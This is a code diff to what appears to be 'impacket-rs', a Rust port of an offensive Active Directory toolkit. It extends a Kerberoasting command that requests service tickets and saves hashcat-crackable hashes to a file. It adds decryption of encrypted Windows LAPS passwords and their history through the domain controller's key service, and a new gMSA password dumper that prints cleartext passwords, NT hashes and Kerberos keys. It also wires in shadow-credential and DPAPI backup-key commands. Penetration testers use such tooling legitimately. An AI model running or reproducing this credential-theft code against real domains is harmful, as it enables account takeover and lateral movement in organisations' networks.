+    pub target_user: Option<String>,
+    pub output_file: Option<String>,
+    pub dc_ip: Option<String>,
+    pub port: u16,
+    pub requested_etypes: Vec<KerberosEType>,
+}
 
-    let spec = match parse_target_with_hashes(args) {
-        Ok(s) => s,
-        Err(e) => {
-            eprintln!("[-] Error parsing target: {}", e);
-            std::process::exit(1);
-        }
-    };
-
+pub fn parse_get_user_spns_options(args: &[String]) -> Result<GetUserSpnsOptions, String> {
     let mut do_request = false;
     let mut do_save = false;
-    let mut target_spn: Option<String> = None;
-    let mut dc_ip: Option<String> = None;
+    let mut target_spn = None;
+    let mut target_user = None;
+    let mut output_file = None;
+    let mut dc_ip = None;
     let mut port: u16 = 389;
+    let mut requested_etypes = vec![KerberosEType::Rc4Hmac];
+    let mut explicit_etype = false;
 
     let mut i = 1;
     while i < args.len() {
@@ -5305,6 +5909,51 @@ fn cmd_get_user_spns(args: &[String]) {
                 target_spn = Some(args[i + 1].clone());
                 i += 2;
             }
+            "-request-user" | "-user" if i + 1 < args.len() => {
+                target_user = Some(args[i + 1].clone());
+                i += 2;
+            }
+            "-outputfile" | "-output-file" | "-o" if i + 1 < args.len() => {
+                output_file = Some(args[i + 1].clone());
+                i += 2;
+            }
+            "-aes" => {
+                if !explicit_etype {
+                    requested_etypes = vec![
+                        KerberosEType::Aes256CtsHmacSha1_96,
+                        KerberosEType::Aes128CtsHmacSha1_96,
+                    ];
+                }
+                i += 1;
+            }
+            "-etype" if i + 1 < args.len() => {
+                explicit_etype = true;
+                match args[i + 1].to_lowercase().as_str() {
+                    "rc4" | "23" => requested_etypes = vec![KerberosEType::Rc4Hmac],
+                    "aes128" | "17" => requested_etypes = vec![KerberosEType::Aes128CtsHmacSha1_96],
+                    "aes256" | "18" => requested_etypes = vec![KerberosEType::Aes256CtsHmacSha1_96],
+                    "aes" => {
+                        requested_etypes = vec![
+                            KerberosEType::Aes256CtsHmacSha1_96,
+                            KerberosEType::Aes128CtsHmacSha1_96,
+                        ];
+                    }
+                    "all" => {
+                        requested_etypes = vec![
+                            KerberosEType::Rc4Hmac,
+                            KerberosEType::Aes256CtsHmacSha1_96,
+                            KerberosEType::Aes128CtsHmacSha1_96,
+                        ];
+                    }
+                    other => {
+                        return Err(format!(
+                            "Unknown Kerberos etype '{}' (expected: rc4, aes128, aes256, aes, all)",
+                            other
+                        ));
+                    }
+                }
+                i += 2;
+            }
             "-dc-ip" if i + 1 < args.len() => {
                 dc_ip = Some(args[i + 1].clone());
                 i += 2;
@@ -5319,8 +5968,47 @@ fn cmd_get_user_spns(args: &[String]) {
         }
     }
 
-    let kdc_host = dc_ip.as_deref().unwrap_or_else(|| spec.effective_target_ip());
-    let addr = format!("{}:{}", kdc_host, port);
+    Ok(GetUserSpnsOptions {
+        do_request,
+        do_save,
+        target_spn,
+        target_user,
+        output_file,
+        dc_ip,
+        port,
+        requested_etypes,
+    })
+}
+
+fn cmd_get_user_spns(args: &[String]) {
+    print!("{}", version::BANNER);
+    if args.is_empty() || args.iter().any(|a| a == "-h" || a == "--help") {
+        eprintln!("Usage: impacket-rs GetUserSPNs <TARGET> [-request] [-aes] [-etype <rc4|aes128|aes256|all>] [-user <name>] [-spn <spn>] [-outputfile <file>] [-save] [-dc-ip <ip>] [-port <port>]");
+        eprintln!("       impacket-rs GetUserSPNs domain/user:password@target-ip -request -outputfile hashes.txt");
+        if args.iter().any(|a| a == "-h" || a == "--help") {
+            return;
+        }
+        std::process::exit(1);
+    }
+
+    let spec = match parse_target_with_hashes(args) {
+        Ok(s) => s,
+        Err(e) => {
+            eprintln!("[-] Error parsing target: {}", e);
+            std::process::exit(1);
+        }
+    };
+
+    let opts = match parse_get_user_spns_options(args) {
+        Ok(o) => o,
+        Err(e) => {
+            eprintln!("[-] Error parsing GetUserSPNs options: {}", e);
+            std::process::exit(1);
+        }
+    };
+
+    let kdc_host = opts.dc_ip.as_deref().unwrap_or_else(|| spec.effective_target_ip());
+    let addr = format!("{}:{}", kdc_host, opts.port);
 
     println!("[*] Connecting to LDAP server at {}...", addr);
     let mut client = match LdapClient::connect(&addr, DEFAULT_TIMEOUT) {
@@ -5417,6 +6105,11 @@ fn cmd_get_user_spns(args: &[String]) {
         }
 
         if (uac & 0x0002) == 0 && !sam.is_empty() && !spns.is_empty() {
+            if let Some(ref filter_user) = opts.target_user {
+                if !sam.eq_ignore_ascii_case(filter_user) {
+                    continue;
+                }
+            }
             accounts.push(SpnAccount {
                 sam_name: sam,
                 spns,
@@ -5436,7 +6129,7 @@ fn cmd_get_user_spns(args: &[String]) {
     }
     println!();
 
-    if !do_request {
+    if !opts.do_request {
         return;
     }
 
@@ -5483,7 +6176,7 @@ fn cmd_get_user_spns(args: &[String]) {
 
     for acc in &accounts {
         for spn in &acc.spns {
-            if let Some(ref filter_spn) = target_spn {
+            if let Some(ref filter_spn) = opts.target_spn {
                 if !spn.eq_ignore_ascii_case(filter_spn) {
                     continue;
                 }
@@ -5497,7 +6190,7 @@ fn cmd_get_user_spns(args: &[String]) {
                 &tgt_ticket,
                 &session_key,
                 session_key_etype,
-                &[KerberosEType::Rc4Hmac],
+                &opts.requested_etypes,
             );
 
             match get_tgs_live(kdc_host, 88, &tgs_req, now_unix, DEFAULT_TIMEOUT) {
@@ -5505,14 +6198,41 @@ fn cmd_get_user_spns(args: &[String]) {
                     match tgs_rep.to_hashcat_format(&acc.sam_name, spn) {
                         Some(hashcat_line) => {
                             println!("{}", hashcat_line);
+                            if let Some(ref out_file) = opts.output_file {
+                                use std::io::Write;
+                                match std::fs::OpenOptions::new()
+                                    .create(true)
+                                    .append(true)
+                                    .open(out_file)
+                                {
+                                    Ok(mut f) => {
+                                        if let Err(e) = writeln!(f, "{}", hashcat_line) {
+                                            eprintln!("[-] Error writing to '{}': {}", out_file, e);
+                                        } else {
+                                            println!("[+] Appended hashcat ticket to '{}'", out_file);
+                                        }
+                                    }
+                                    Err(e) => {
+                                        eprintln!("[-] Failed opening output file '{}': {}", out_file, e);
+                                    }
+                                }
+                            }
                         }
                         None => {
-                            eprintln!("[-] Unable to format Hashcat string for ticket etype {}", tgs_rep.ticket_enc_etype);
+                            eprintln!(
+                                "[-] Unable to format Hashcat string for ticket etype {}",
+                                tgs_rep.ticket_enc_etype
+                            );
                         }
                     }
 
-                    if do_save {
-                        let ccache = tgs_rep.to_ccache(&spec.domain, &spec.username, &session_key, session_key_etype as u16);
+                    if opts.do_save {
+                        let ccache = tgs_rep.to_ccache(
+                            &spec.domain,
+                            &spec.username,
+                            &session_key,
+                            session_key_etype as u16,
+                        );
                         let file_name = format!("{}.ccache", acc.sam_name);
                         match std::fs::write(&file_name, ccache.to_bytes()) {
                             Ok(()) => println!("[+] Saved ticket to '{}'", file_name),
@@ -9207,7 +9927,7 @@ fn cmd_smbserver(args: &[String]) {
 
 fn cmd_get_laps_password(args: &[String]) {
     if args.is_empty() {
-        eprintln!("Usage: impacket-rs GetLAPSPassword <TARGET> [-computer <NAME>] [-port <PORT>]");
+        eprintln!("Usage: impacket-rs GetLAPSPassword <TARGET> [-computer <NAME>] [-port <PORT>] [-l2key <HEX>] [-history]");
         std::process::exit(1);
     }
     let spec = match parse_target_with_hashes(args) {
@@ -9219,6 +9939,8 @@ fn cmd_get_laps_password(args: &[String]) {
     };
     let mut port: u16 = 389;
     let mut target_computer: Option<String> = None;
+    let mut manual_l2_key: Option<Vec<u8>> = None;
+    let mut include_history = false;
     let mut i = 1;
     while i < args.len() {
         match args[i].as_str() {
@@ -9231,6 +9953,20 @@ fn cmd_get_laps_password(args: &[String]) {
                     port = p;
                 }
                 i += 2;
+            }
+            "-l2key" if i + 1 < args.len() => {
+                match impacket_core::decode_hex(&args[i + 1]) {
+                    Ok(k) => manual_l2_key = Some(k),
+                    Err(e) => {
+                        eprintln!("[-] Invalid hex string for -l2key: {}", e);
+                        std::process::exit(1);
+                    }
+                }
+                i += 2;
+            }
+            "-history" => {
+                include_history = true;
+                i += 1;
             }
             _ => i += 1,
         }
@@ -9283,6 +10019,8 @@ fn cmd_get_laps_password(args: &[String]) {
             filter_or(&[
                 filter_present("ms-Mcs-AdmPwd"),
                 filter_present("msLAPS-Password"),
+                filter_present("msLAPS-EncryptedPassword"),
+                filter_present("msLAPS-EncryptedPasswordHistory"),
             ]),
         ])
     };
@@ -9294,6 +10032,8 @@ fn cmd_get_laps_password(args: &[String]) {
         "ms-Mcs-AdmPwdExpirationTime",
         "msLAPS-Password",
         "msLAPS-PasswordExpirationTime",
+        "msLAPS-EncryptedPassword",
+        "msLAPS-EncryptedPasswordHistory",
     ];
     println!("[*] Querying LAPS and Windows LAPS attributes under '{}'...", base_dn);
     let entries = match client.search(&base_dn, SearchScope::WholeSubtree, &filter, &attributes) {
@@ -9308,21 +10048,79 @@ fn cmd_get_laps_password(args: &[String]) {
         println!("[-] No LAPS passwords found matching query.");
         return;
     }
-    println!("\n{:<25} {:<16} {:<30} {:<24}", "Computer Name", "LAPS Type", "Password", "Expiration");
-    println!("{:-<25} {:-<16} {:-<30} {:-<24}", "", "", "", "");
+
+    let cred = credential_from(&spec).map_err(CoreError::ProtocolError);
+    let mut l2_cache: std::collections::HashMap<([u8; 16], i32, i32, i32), Vec<u8>> =
+        std::collections::HashMap::new();
+
+    let mut resolve_l2_key = |root_id: &[u8; 16], l0: i32, l1: i32, l2: i32| -> Result<Vec<u8>, CoreError> {
+        if let Some(ref k) = manual_l2_key {
+            return Ok(k.clone());
+        }
+        let cache_key = (*root_id, l0, l1, l2);
+        if let Some(k) = l2_cache.get(&cache_key) {
+            return Ok(k.clone());
+        }
+        let cred_val = match &cred {
+            Ok(c) => c,
+            Err(e) => {
+                return Err(CoreError::ProtocolError(format!(
+                    "Cannot connect to DC MS-GKDI without credentials: {}",
+                    e
+                )))
+            }
+        };
+        println!("[*] Connecting to DC over MS-GKDI (\\PIPE\\protected_storage) to fetch L2 key...");
+        let mut transport = SmbPipeTransport::connect(
+            host,
+            &spec.domain,
+            &spec.username,
+            cred_val,
+            "protected_storage",
+            GKDI_INTERFACE_UUID,
+            GKDI_VERSION_MAJOR,
+            GKDI_VERSION_MINOR,
+            spec.compat_profile,
+            DEFAULT_TIMEOUT,
+        )?;
+        let mut gkdi = GkdiClient::new(&mut transport);
+        let env = gkdi.get_key(None, Some(root_id), l0, l1, l2)?;
+        match env.l2_key {
+            Some(k) => {
+                println!("[+] Successfully retrieved L2 key from DC KDS service ({} bytes)", k.len());
+                l2_cache.insert(cache_key, k.clone());
+                Ok(k)
+            }
+            None => Err(CoreError::ProtocolError(
+                "GKDI response did not contain an L2 key".into(),
+            )),
+        }
+    };
+
+    println!("\n{:<25} {:<24} {:<30} {:<24}", "Computer Name", "LAPS Type", "Password", "Expiration");
+    println!("{:-<25} {:-<24} {:-<30} {:-<24}", "", "", "", "");
     for entry in entries {
         let sam = entry.get_string("sAMAccountName").unwrap_or_else(|| "<unknown>".into());
         let dns = entry.get_string("dNSHostName").unwrap_or(sam);
 
+        // 1. Legacy LAPS
         if let Some(pwd) = entry.get_string("ms-Mcs-AdmPwd") {
             let exp_raw = entry.get_string("ms-Mcs-AdmPwdExpirationTime").unwrap_or_default();
             let exp_str = format_filetime_str(&exp_raw);
-            println!("{:<25} {:<16} {:<30} {:<24}", dns, "Legacy LAPS", pwd, exp_str);
+            println!("{:<25} {:<24} {:<30} {:<24}", dns, "Legacy LAPS", pwd, exp_str);
         }
+
+        // 2. Cleartext Windows LAPS
         if let Some(laps_pwd) = entry.get_string("msLAPS-Password") {
             let exp_raw = entry.get_string("msLAPS-PasswordExpirationTime").unwrap_or_default();
             let exp_str = format_filetime_str(&exp_raw);
-            let disp_pwd = if let Some(p_idx) = laps_pwd.find(r#""p":""#) {
+            let disp_pwd = if let Ok(parsed) = impacket_sam::parse_laps_json(&laps_pwd, 0) {
+                if !parsed.password.is_empty() {
+                    parsed.password
+                } else {
+                    laps_pwd
+                }
+            } else if let Some(p_idx) = laps_pwd.find(r#""p":""#) {
                 let rest = &laps_pwd[p_idx + 5..];
                 if let Some(end_idx) = rest.find('"') {
                     rest[..end_idx].to_string()
@@ -9332,8 +10130,315 @@ fn cmd_get_laps_password(args: &[String]) {
             } else {
                 laps_pwd
             };
-            println!("{:<25} {:<16} {:<30} {:<24}", dns, "Windows LAPS", disp_pwd, exp_str);
+            println!("{:<25} {:<24} {:<30} {:<24}", dns, "Windows LAPS", disp_pwd, exp_str);
         }
+
+        // 3. Encrypted Windows LAPS v2
+        if let Some(enc_bytes) = entry.get_first_raw("msLAPS-EncryptedPassword") {
+            match impacket_sam::LapsEncryptedBlob::parse(enc_bytes) {
+                Ok(blob) => {
+                    let exp_raw = entry.get_string("msLAPS-PasswordExpirationTime").unwrap_or_default();
+                    let exp_str = format_filetime_str(&exp_raw);
+                    match resolve_l2_key(&blob.root_key_id, blob.l0_index, blob.l1_index, blob.l2_index) {
+                        Ok(l2_key) => {
+                            match impacket_sam::decrypt_laps_blob(&blob, &l2_key) {
+                                Ok(res) => {
+                                    let disp_type = if !res.account_name.is_empty() {
+                                        format!("Windows LAPS ({})", res.account_name)
+                                    } else {
+                                        "Windows LAPS v2".into()
+                                    };
+                                    println!("{:<25} {:<24} {:<30} {:<24}", dns, disp_type, res.password, exp_str);
+                                }
+                                Err(e) => {
+                                    println!("{:<25} {:<24} {:<30} {:<24}", dns, "Windows LAPS v2", format!("[Decrypt error: {}]", e), exp_str);
+                                }
+                            }
+                        }
+                        Err(e) => {
+                            println!("{:<25} {:<24} {:<30} {:<24}", dns, "Windows LAPS v2", format!("[GKDI error: {}]", e), exp_str);
+                        }
+                    }
+                }
+                Err(e) => {
+                    println!("{:<25} {:<24} {:<30} {:<24}", dns, "Windows LAPS v2", format!("[Parse error: {}]", e), "");
+                }
+            }
+        }
+
+        // 4. Encrypted Windows LAPS v2 History
+        if include_history {
+            if let Some(hist_slices) = entry.get_raw("msLAPS-EncryptedPasswordHistory") {
+                for hist_bytes in hist_slices {
+                    if let Ok(blob) = impacket_sam::LapsEncryptedBlob::parse(hist_bytes) {
+                        let exp_str = if blob.timestamp != 0 {
+                            format_filetime_str(&blob.timestamp.to_string())
+                        } else {
+                            "<history>".into()
+                        };
+                        if let Ok(l2_key) = resolve_l2_key(&blob.root_key_id, blob.l0_index, blob.l1_index, blob.l2_index) {
+                            if let Ok(res) = impacket_sam::decrypt_laps_blob(&blob, &l2_key) {
+                                let disp_type = if !res.account_name.is_empty() {
+                                    format!("LAPS Hist ({})", res.account_name)
+                                } else {
+                                    "Windows LAPS Hist".into()
+                                };
+                                println!("{:<25} {:<24} {:<30} {:<24}", dns, disp_type, res.password, exp_str);
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+}
+
+fn cmd_get_gmsa_password(args: &[String]) {
+    if args.is_empty() {
+        eprintln!("Usage: impacket-rs getGMSAPassword <TARGET> [-account <NAME>] [-port <PORT>] [-raw <HEX>]");
+        std::process::exit(1);
+    }
+
+    let mut raw_hex: Option<String> = None;
+    let mut target_account: Option<String> = None;
+    let mut port: u16 = 389;
+    let mut target_str: Option<String> = None;
+
+    let mut i = 0;
+    while i < args.len() {
+        match args[i].as_str() {
+            "-account" if i + 1 < args.len() => {
+                target_account = Some(args[i + 1].clone());
+                i += 2;
+            }
+            "-port" if i + 1 < args.len() => {
+                if let Ok(p) = args[i + 1].parse() {
+                    port = p;
+                }
+                i += 2;
+            }
+            "-raw" if i + 1 < args.len() => {
+                raw_hex = Some(args[i + 1].clone());
+                i += 2;
+            }
+            arg if !arg.starts_with('-') && target_str.is_none() => {
+                target_str = Some(arg.to_string());
+                i += 1;
+            }
+            _ => i += 1,
+        }
+    }
+
+    // 1. Offline Mode (-raw <HEX>)
+    if let Some(hex_str) = raw_hex {
+        println!("[*] Parsing MSDS-MANAGEDPASSWORD_BLOB (offline mode)...");
+        let raw_bytes = match impacket_core::decode_hex(&hex_str) {
+            Ok(b) => b,
+            Err(e) => {
+                eprintln!("[-] Invalid hex string for -raw: {}", e);
+                std::process::exit(1);
+            }
+        };
+        let blob = match impacket_sam::ManagedPasswordBlob::parse(&raw_bytes) {
+            Ok(b) => b,
+            Err(e) => {
+                eprintln!("[-] Failed to parse MSDS-MANAGEDPASSWORD_BLOB: {}", e);
+                std::process::exit(1);
+            }
+        };
+
+        println!("[*] Blob Version: {}", blob.version);
+        let q_days = blob.query_interval / (10_000_000 * 86_400);
+        let u_days = blob.unchanged_interval / (10_000_000 * 86_400);
+        println!("[*] Query Password Interval: {} days ({} ticks)", q_days, blob.query_interval);
+        println!("[*] Unchanged Password Interval: {} days ({} ticks)", u_days, blob.unchanged_interval);
+        println!("[+] Current Password: {}", blob.current_password);
+        println!("[+] Current NT Hash:  {}", blob.current_nt_hash_hex());
+
+        if let Some(ref prev_pwd) = blob.previous_password {
+            println!("[+] Previous Password: {}", prev_pwd);
+            println!("[+] Previous NT Hash:  {}", blob.previous_nt_hash_hex().unwrap_or_default());
+        }
+
+        if let Some(ref acc) = target_account {
+            let sam = if acc.ends_with('$') { acc.clone() } else { format!("{}$", acc) };
+            let domain = target_str
+                .as_deref()
+                .and_then(|t| TargetSpec::parse(t).ok())
+                .map(|s| s.domain)
+                .unwrap_or_default();
+            if !domain.is_empty() {
+                let salt = format!("{}{}", domain.to_uppercase(), sam);
+                let aes256 = string_to_key_aes256(&blob.current_password, &salt, 4096);
+                let aes128 = string_to_key_aes128(&blob.current_password, &salt, 4096);
+                println!("[*] Kerberos Salt: {}", salt);
+                println!("[*] Kerberos Key (AES-256): {}", impacket_core::encode_hex(&aes256));
+                println!("[*] Kerberos Key (AES-128): {}", impacket_core::encode_hex(&aes128));
+            }
+        }
+        return;
+    }
+
+    // 2. Online Mode via LDAP
+    let spec = match parse_target_with_hashes(args) {
+        Ok(s) => s,
+        Err(e) => {
+            eprintln!("[-] Error parsing target: {}", e);
+            std::process::exit(1);
+        }
+    };
+
+    let host = spec.effective_target_ip();
+    let addr = format!("{}:{}", host, port);
+    println!("[*] Connecting to LDAP server at {}...", addr);
+    let mut client = match LdapClient::connect(&addr, DEFAULT_TIMEOUT) {
+        Ok(c) => c,
+        Err(e) => {
+            eprintln!("[-] Failed to connect to LDAP server at {}: {}", addr, e);
+            std::process::exit(1);
+        }
+    };
+
+    let bind_dn = if spec.username.is_empty() {
+        String::new()
+    } else if spec.username.contains('@') || spec.username.to_uppercase().contains("DC=") {
+        spec.username.clone()
+    } else if !spec.domain.is_empty() {
+        format!("{}@{}", spec.username, spec.domain)
+    } else {
+        spec.username.clone()
+    };
+    let password = spec.password.as_ref().map(|p| p.expose_secret()).unwrap_or("");
+    if !bind_dn.is_empty() {
+        println!("[*] Performing LDAP bind as '{}'...", bind_dn);
+        if let Err(e) = client.bind_simple(&bind_dn, password) {
+            eprintln!("[-] LDAP bind failed: {}", e);
+            std::process::exit(1);
+        }
+        println!("[+] Bind successful");
+    } else {
+        println!("[*] Performing anonymous LDAP bind...");
+        if let Err(e) = client.bind_simple("", "") {
+            eprintln!("[-] Anonymous bind failed: {}", e);
+            std::process::exit(1);
+        }
+    }
+
+    let base_dn = domain_to_base_dn(&spec.domain);
+    let filter = if let Some(ref acc) = target_account {
+        let acc_with_dollar = if acc.ends_with('$') { acc.clone() } else { format!("{}$", acc) };
+        filter_and(&[
+            filter_equality("objectClass", "msDS-GroupManagedServiceAccount"),
+            filter_or(&[
+                filter_equality("sAMAccountName", acc),
+                filter_equality("sAMAccountName", &acc_with_dollar),
+            ]),
+        ])
+    } else {
+        filter_equality("objectClass", "msDS-GroupManagedServiceAccount")
+    };
+
+    let attributes = [
+        "sAMAccountName",
+        "dNSHostName",
+        "description",
+        "objectSid",
+        "msDS-ManagedPassword",
+        "msDS-GroupMSAMembership",
+    ];
+    println!("[*] Querying gMSA accounts under '{}'...", base_dn);
+    let entries = match client.search(&base_dn, SearchScope::WholeSubtree, &filter, &attributes) {
+        Ok(e) => e,
+        Err(e) => {
+            eprintln!("[-] LDAP search failed: {}", e);
+            std::process::exit(1);
+        }
+    };
+
+    if entries.is_empty() {
+        println!("[-] No Group Managed Service Accounts (gMSA) found matching query.");
+        return;
+    }
+
+    println!("[+] Found {} gMSA account(s)\n", entries.len());
+
+    for entry in entries {
+        let sam = entry.get_string("sAMAccountName").unwrap_or_else(|| "<unknown>".into());
+        let dns = entry.get_string("dNSHostName").unwrap_or_default();
+        let desc = entry.get_string("description").unwrap_or_default();
+        let sid_str = entry
+            .get_first_raw("objectSid")
+            .and_then(|b| RpcSid::from_le_bytes(b).ok())
+            .map(|s| s.to_string())
+            .unwrap_or_default();
+
+        println!("================================================================================");
+        println!("Account:     {}", sam);
+        if !dns.is_empty() {
+            println!("DNS Name:    {}", dns);
+        }
+        if !sid_str.is_empty() {
+            println!("Object SID:  {}", sid_str);
+        }
+        if !desc.is_empty() {
+            println!("Description: {}", desc);
+        }
+        println!("--------------------------------------------------------------------------------");
+
+        if let Some(raw_blob) = entry.get_first_raw("msDS-ManagedPassword") {
+            match impacket_sam::ManagedPasswordBlob::parse(raw_blob) {
+                Ok(blob) => {
+                    let q_days = blob.query_interval / (10_000_000 * 86_400);
+                    let u_days = blob.unchanged_interval / (10_000_000 * 86_400);
+                    println!("[*] Blob Version: {}", blob.version);
+                    println!("[*] Query Password Interval: {} days ({} ticks)", q_days, blob.query_interval);
+                    println!("[*] Unchanged Password Interval: {} days ({} ticks)", u_days, blob.unchanged_interval);
+                    println!("[+] Current Password: {}", blob.current_password);
+                    println!("[+] Current NT Hash:  {}", blob.current_nt_hash_hex());
+
+                    if let Some(ref prev_pwd) = blob.previous_password {
+                        println!("[+] Previous Password: {}", prev_pwd);
+                        println!("[+] Previous NT Hash:  {}", blob.previous_nt_hash_hex().unwrap_or_default());
+                    }
+
+                    let domain = if !spec.domain.is_empty() {
+                        spec.domain.to_uppercase()
+                    } else {
+                        "DOMAIN".into()
+                    };
+                    let salt = format!("{}{}", domain, sam);
+                    let aes256 = string_to_key_aes256(&blob.current_password, &salt, 4096);
+                    let aes128 = string_to_key_aes128(&blob.current_password, &salt, 4096);
+                    println!("[*] Kerberos Salt: {}", salt);
+                    println!("[*] Kerberos Key (AES-256): {}", impacket_core::encode_hex(&aes256));
+                    println!("[*] Kerberos Key (AES-128): {}", impacket_core::encode_hex(&aes128));
+                }
+                Err(e) => {
+                    println!("[-] Failed to parse msDS-ManagedPassword blob: {}", e);
+                }
+            }
+        } else {
+            println!("[-] msDS-ManagedPassword attribute not returned (Access Denied / Insufficient Rights)");
+        }
+
+        if let Some(sd_bytes) = entry.get_first_raw("msDS-GroupMSAMembership") {
+            match impacket_ldap::SecurityDescriptor::parse(sd_bytes) {
+                Ok(sd) => {
+                    if let Some(ref dacl) = sd.dacl {
+                        println!("[*] Authorized Principals in msDS-GroupMSAMembership DACL ({} ACEs):", dacl.aces.len());
+                        for ace in &dacl.aces {
+                            println!("    -> Trustee SID: {} (Type: 0x{:02X}, Mask: 0x{:08X})", ace.sid, ace.ace_type, ace.mask);
+                        }
+                    } else {
+                        println!("[*] msDS-GroupMSAMembership has no DACL (empty)");
+                    }
+                }
+                Err(e) => {
+                    println!("[-] Failed to parse msDS-GroupMSAMembership SecurityDescriptor: {}", e);
+                }
+            }
+        }
+        println!();
     }
 }
 
@@ -12166,6 +13271,9 @@ fn main() {
         Some("GetLAPSPassword") | Some("getlapspassword") | Some("get-laps-password") => {
             cmd_get_laps_password(&args[1..])
         }
+        Some("getGMSAPassword") | Some("getgmsapassword") | Some("get-gmsa-password") | Some("gmsadumper") | Some("gmsa") => {
+            cmd_get_gmsa_password(&args[1..])
+        }
         Some("CheckLDAPStatus") | Some("checkldapstatus") | Some("check-ldap-status") => {
             cmd_check_ldap_status(&args[1..])
         }
@@ -12181,6 +13289,9 @@ fn main() {
             cmd_dfsclient(&args[1..])
         }
         Some("certipy") | Some("adcs") => cmd_certipy(&args[1..]),
+        Some("whisker") | Some("shadowcred") | Some("shadow-credentials") => {
+            cmd_whisker(&args[1..])
+        }
         Some("coerce") => cmd_coerce(&args[1..]),
         Some("getTGT") | Some("get-tgt") => cmd_get_tgt(&args[1..]),
         Some("getST") | Some("get-st") => cmd_get_st(&args[1..]),
@@ -12231,6 +13342,7 @@ fn main() {
         Some("ntdsdump") | Some("ntds-dump") => cmd_ntdsdump(&args[1..]),
         Some("esentutl") => cmd_esentutl(&args[1..]),
         Some("dpapi") => cmd_dpapi(&args[1..]),
+        Some("backupkey") | Some("backupkeys") | Some("bkrp") => cmd_backupkey(&args[1..]),
         Some("Get-GPPPassword")
         | Some("get-gpppassword")
         | Some("get-gpp-password")
@@ -12307,5 +13419,103 @@ mod tests {
         assert_eq!(proxy2.proxy_type, impacket_core::ProxyType::HttpConnect);
         assert_eq!(proxy2.host, "proxy.corp.internal");
         assert_eq!(proxy2.port, 8080);
+    }
+
+    #[test]
+    fn test_gmsa_offline_parsing_and_kerberos_keys() {
+        let blob = impacket_sam::ManagedPasswordBlob {
+            version: 1,
+            current_password: "ComplexGmsaP@ssword2026!#$".into(),
+            current_nt_hash: impacket_sam::compute_nt_hash("ComplexGmsaP@ssword2026!#$"),
+            previous_password: Some("OldGmsaP@ssword2025!".into()),
+            previous_nt_hash: Some(impacket_sam::compute_nt_hash("OldGmsaP@ssword2025!")),
+            query_interval: 25920000000000,
+            unchanged_interval: 25920000000000,
+        };
+        let bytes = blob.to_bytes();
+        let hex_str = impacket_core::encode_hex(&bytes);
+        let parsed = impacket_sam::ManagedPasswordBlob::parse(&impacket_core::decode_hex(&hex_str).unwrap()).unwrap();
+        assert_eq!(parsed.current_password, "ComplexGmsaP@ssword2026!#$");
+        assert_eq!(parsed.previous_password.as_deref(), Some("OldGmsaP@ssword2025!"));
+
+        let salt = format!("{}{}", "CORP.LOCAL", "svc_gmsa$");
+        let aes256 = string_to_key_aes256(&parsed.current_password, &salt, 4096);
+        let aes128 = string_to_key_aes128(&parsed.current_password, &salt, 4096);
+        assert_eq!(aes256.len(), 32);
+        assert_eq!(aes128.len(), 16);
+    }
+
+    #[test]
+    fn test_backupkey_action_guid_constants_and_stub() {
+        use impacket_msrpc::bkrp::{
+            build_backupr_key_stub, BACKUPKEY_BACKUP_GUID, BACKUPKEY_RESTORE_GUID,
+            BACKUPKEY_RESTORE_GUID_WIN2K, BACKUPKEY_RETRIEVE_BACKUP_KEY_GUID,
+        };
+        assert_eq!(BACKUPKEY_RETRIEVE_BACKUP_KEY_GUID.len(), 16);
+        assert_eq!(BACKUPKEY_RESTORE_GUID.len(), 16);
+        assert_eq!(BACKUPKEY_BACKUP_GUID.len(), 16);
+        assert_eq!(BACKUPKEY_RESTORE_GUID_WIN2K.len(), 16);
+
+        let stub = build_backupr_key_stub(&BACKUPKEY_RETRIEVE_BACKUP_KEY_GUID, None, 0);
+        assert!(!stub.is_empty());
+    }
+
+    #[test]
+    fn test_parse_get_user_spns_options() {
+        let args_default = vec!["corp/user:pass@10.0.0.1".to_string()];
+        let opts_default = parse_get_user_spns_options(&args_default).unwrap();
+        assert!(!opts_default.do_request);
+        assert_eq!(opts_default.requested_etypes, vec![KerberosEType::Rc4Hmac]);
+        assert!(opts_default.target_user.is_none());
+        assert!(opts_default.output_file.is_none());
+
+        let args_aes = vec![
+            "corp/user:pass@10.0.0.1".to_string(),
+            "-request".to_string(),
+            "-aes".to_string(),
+            "-outputfile".to_string(),
+            "hashes.txt".to_string(),
+            "-user".to_string(),
+            "sql_svc".to_string(),
+            "-spn".to_string(),
+            "MSSQLSvc/db.corp.local:1433".to_string(),
+        ];
+        let opts_aes = parse_get_user_spns_options(&args_aes).unwrap();
+        assert!(opts_aes.do_request);
+        assert_eq!(
+            opts_aes.requested_etypes,
+            vec![
+                KerberosEType::Aes256CtsHmacSha1_96,
+                KerberosEType::Aes128CtsHmacSha1_96,
+            ]
+        );
+        assert_eq!(opts_aes.output_file.as_deref(), Some("hashes.txt"));
+        assert_eq!(opts_aes.target_user.as_deref(), Some("sql_svc"));
+        assert_eq!(
+            opts_aes.target_spn.as_deref(),
+            Some("MSSQLSvc/db.corp.local:1433")
+        );
+
+        let args_all = vec![
+            "target".to_string(),
+            "-etype".to_string(),
+            "all".to_string(),
+        ];
+        let opts_all = parse_get_user_spns_options(&args_all).unwrap();
+        assert_eq!(
+            opts_all.requested_etypes,
+            vec![
+                KerberosEType::Rc4Hmac,
+                KerberosEType::Aes256CtsHmacSha1_96,
+                KerberosEType::Aes128CtsHmacSha1_96,
+            ]
+        );
+
+        let args_bad = vec![
+            "target".to_string(),
+            "-etype".to_string(),
+            "invalid".to_string(),
+        ];
+        assert!(parse_get_user_spns_options(&args_bad).is_err());
     }
 }
